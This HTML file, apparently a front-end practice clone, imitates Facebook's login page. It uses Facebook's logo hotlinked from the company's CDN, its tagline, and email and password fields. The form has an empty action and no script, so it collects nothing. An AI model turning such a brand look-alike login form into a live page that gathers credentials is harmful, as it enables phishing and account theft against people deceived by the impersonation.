<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>facebook</title>
    <link rel="stylesheet" href="./css/style.css">
</head>
<body>
         <div class="container">
                                        <!-- Logo and description -->
                <div class="main-article">
                         <img class="logo-im" src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" width="301" height="106" alt="">
                           <p class="description">Connect with friends and the world around you on Facebook.</p>

                </div>
                   

                                          <!-- Login form -->

                <div class="login-sec">
                   
                    
                    <form action="" method="post">
                            
                                <input class="input" type="email" name="email" id="email" placeholder="Email or phone number">

                                <input class="input" type="password" name="password" id="password" placeholder="password">

                           
                                <button class="submit-btn" type="submit">Log In</button>

                                <a class="link" href="#">Forgot password?</a>

                                <div class="line"></div>
                                <button class="create-account-btn">Create new account</button>



                    </form>

                    <p class="last-paragraph"><a class="create-page" href="">Create a Page </a> for a celebrity, brand or business.</p>
                        
              </div>
                               




         </div>
